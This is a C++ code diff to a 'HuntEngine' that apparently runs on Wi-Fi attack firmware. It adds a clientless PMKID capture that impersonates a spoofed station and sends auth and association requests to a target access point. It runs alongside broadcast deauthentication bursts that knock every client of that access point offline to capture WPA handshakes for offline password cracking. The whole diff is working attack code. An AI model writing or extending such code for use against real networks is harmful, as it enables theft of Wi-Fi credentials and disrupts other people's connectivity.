@@ -122,10 +122,18 @@ void HuntEngine::doStartCapturing(uint32_t nowMs) {
             }
             if (retuneTo(target.channel)) {
                 collector_.retarget(target.bssid, target.channel);
+                // The solicit assoc needs the target SSID; the collector carries it only once a beacon is
+                // heard, so copy it from the discovered AP now (app task, under the §4 #11 settle). A
+                // hidden network (empty SSID) solicits with an empty SSID element and the AP will not
+                // answer — fail-toward-nothing, and a hidden PMKID has no ESSID for the WPA*02 line anyway.
+                std::strncpy(capturingSsid_, target.ssid, sizeof(capturingSsid_) - 1);
+                capturingSsid_[sizeof(capturingSsid_) - 1] = '\0';
                 activeSink_.store(&handshakeConsumer_, std::memory_order_release);
                 phase_ = Phase::Capturing;
                 phaseDeadlineMs_ = nowMs + config_.captureWindowMs;
-                deauthDueMs_ = nowMs;  // armed: fire the first deauth burst on the first Capturing tick.
+                deauthDueMs_ = nowMs;   // armed: fire the first deauth burst on the first Capturing tick.
+                solicitDueMs_ = nowMs;  // armed: fire the first solicit auth on the first Capturing tick.
+                solicitAssocPending_ = false;  // no assoc half-way through a burst across a retarget.
                 return;
             }
             ++targetIndex_;  // radio rejected this target's channel — skip it, never capture off-channel.
@@ -223,12 +231,18 @@ void HuntEngine::tick(uint32_t nowMs) {
         }
 
         case Phase::Capturing: {
-            if (collector_.isWpaSecValid()) {
-                enterQuiesce(nowMs, Resume::ReportThenAdvance);  // captured: stop deauthing, report.
+            // Two terminal conditions, unified onto the one report path (ADR-0110 #1): a wpa-sec-valid
+            // 4-way, or a clientless-PMKID M1. Reporting once and quiescing out of Capturing is itself the
+            // double-save guard (a window can never report twice, whichever terminal fired first).
+            if (collector_.isWpaSecValid() || collector_.isPmkidValid()) {
+                enterQuiesce(nowMs, Resume::ReportThenAdvance);  // captured: stop transmitting, report.
             } else if (reached(nowMs, phaseDeadlineMs_)) {
                 enterQuiesce(nowMs, Resume::AdvanceNoReport);
             } else {
-                maybeTransmitDeauth(nowMs);  // still capturing this target: force reassociation (armed).
+                // Still capturing this target: the two armed injectors run in parallel (ADR-0110 #2), each
+                // a no-op unless its arm is set and a transmitter is present.
+                maybeTransmitDeauth(nowMs);   // force reassociation to draw a 4-way (or a deauth-forced M1).
+                maybeTransmitSolicit(nowMs);  // impersonate a station to draw a PMKID M1 with no client.
             }
             return;
         }
@@ -304,7 +318,7 @@ HuntSnapshot HuntEngine::huntSnapshot() const {
 }
 
 void HuntEngine::maybeTransmitDeauth(uint32_t nowMs) {
-    if (transmitter_ == nullptr) return;            // disarmed: passive hunt, transmit nothing (#16).
+    if (transmitter_ == nullptr || !deauthArmed_) return;  // no raw-TX path, or deauth disarmed (#16/#5).
     if (!reached(nowMs, deauthDueMs_)) return;      // within the cadence gap — let the client reassociate.
     // Reached only from the Capturing branch, so the collector's target IS the parked AP: source and
     // BSSID = capturingBssid(), destination = broadcast (every client of that AP at once, no scanner).
@@ -322,6 +336,39 @@ void HuntEngine::transmitDeauthFrame(ManagementSubtype subtype, const uint8_t bs
         ++deauthTxOk_;
     } else {
         ++deauthTxFail_;
+    }
+}
+
+void HuntEngine::maybeTransmitSolicit(uint32_t nowMs) {
+    if (transmitter_ == nullptr || !solicitArmed_) return;  // no raw-TX path, or solicit disarmed (#5).
+    // Reached only from the Capturing branch, so the collector's target IS the parked AP: addr1 = the AP
+    // BSSID, addr2 = our spoofed locally-administered STA (so the PMKID binds to a MAC we own, ADR-0110).
+    const uint8_t* bssid = collector_.handshake().bssid;
+    const uint8_t* sta = defaultSolicitStaMac();
+    uint8_t frame[kSolicitFrameBufLen];
+
+    // Phase two: the assoc of an in-flight burst, once the inter-frame gap has elapsed. Sending it arms
+    // the next whole burst on the solicit cadence (ADR-0110 #2).
+    if (solicitAssocPending_) {
+        if (!reached(nowMs, solicitAssocDueMs_)) return;  // within the inter-frame gap.
+        transmitSolicitFrame(frame, buildAssocRequest(frame, sizeof(frame), bssid, sta, capturingSsid_));
+        solicitAssocPending_ = false;
+        solicitDueMs_ = nowMs + config_.solicitIntervalMs;
+        return;
+    }
+    // Phase one: the open-auth of a new burst, once the cadence is due. Arm the assoc for a gap later.
+    if (!reached(nowMs, solicitDueMs_)) return;  // within the cadence gap between bursts.
+    transmitSolicitFrame(frame, buildAuthRequest(frame, sizeof(frame), bssid, sta));
+    solicitAssocDueMs_ = nowMs + config_.solicitInterFrameMs;
+    solicitAssocPending_ = true;
+}
+
+void HuntEngine::transmitSolicitFrame(const uint8_t* frame, uint16_t len) {
+    // A build failure (len 0, e.g. a buffer too small) is a transmit failure, never a silent skip (§3).
+    if (len != 0 && transmitter_->transmit(frame, len)) {
+        ++solicitTxOk_;
+    } else {
+        ++solicitTxFail_;
     }
 }
 
